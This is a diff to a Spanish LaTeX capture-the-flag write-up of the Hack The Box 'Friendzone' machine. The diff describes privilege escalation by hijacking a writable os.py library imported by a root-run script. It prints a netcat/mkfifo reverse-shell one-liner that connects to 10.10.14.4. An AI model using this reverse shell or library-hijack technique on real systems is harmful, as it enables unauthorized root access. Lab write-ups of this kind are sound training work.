@@ -216,13 +216,59 @@ Posteriormente analicé el cron.d y el crontab a ver si encontraba algo pero nad
 
 \begin{figure}[H]
 	\center
-	\includegraphics[width=\textwidth]{images/friendzone/vistazo-cron.png}
+	\includegraphics[width=0.8\textwidth]{images/friendzone/vistazo-cron.png}
 	\caption{contenido del cron}
 \end{figure}
 
-% ----------------------------Omni-----------------------------------
+Luego de todo esto se subió una herramienta para poder ver los procesos corriendo, esta se llama pspy
 
-\clearpage 
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/friendzone/obteniendo-pspy.png}
+	\caption{subiendo pspy}
+\end{figure}
+
+Con esto ya podemos visualizar un proceso raro, este es el "reporter.py"
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/friendzone/reporter.png}
+	\caption{flag del user friendzone}
+\end{figure}
+
+vemos que no tiene permisos de escritura lo cual no dejaría hacer hijacking directamente con él.
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/friendzone/permisos-reporter.png}
+	\caption{Permisos del reporter.py}
+\end{figure}
+
+Pero si revisamos con un cat qué es lo que hace vemos que tiene una librería os siendo llamada.
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/friendzone/cat-reporter.png}
+	\caption{cisualizando el reporter}
+\end{figure}
+
+Y además revisamos que tiene permisos de escritura este archivo, lo cual es sumamente raro en una librería, esta no debería poderse modificar por un usuario convencional en este caso "www-data".
+
+\begin{figure}[H]
+	\center
+	\includegraphics[width=\textwidth]{images/friendzone/permisos-os.png}
+	\caption{permisos del os.py}
+\end{figure}
+
+Entonces lo modificamos y le añadimos las líneas "system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1235 >/tmp/f')" al final del archivo o solo reemplazándolo, y con esto debería ser suficiente.
+esperando en la consola con el netcat obtenemos la reverse shell con permisos de root ya que este proceso corría bajo uid de root.
+
+
+
+
+%----------------------------Omni-----------------------------------
+
+\clearpage
 \section{Omni}
 \subsection{Enumeración}
 Primero se realizó un escaneo de los puertos abiertos con Nmap, con los parámetros “-Pn -A -p-“.
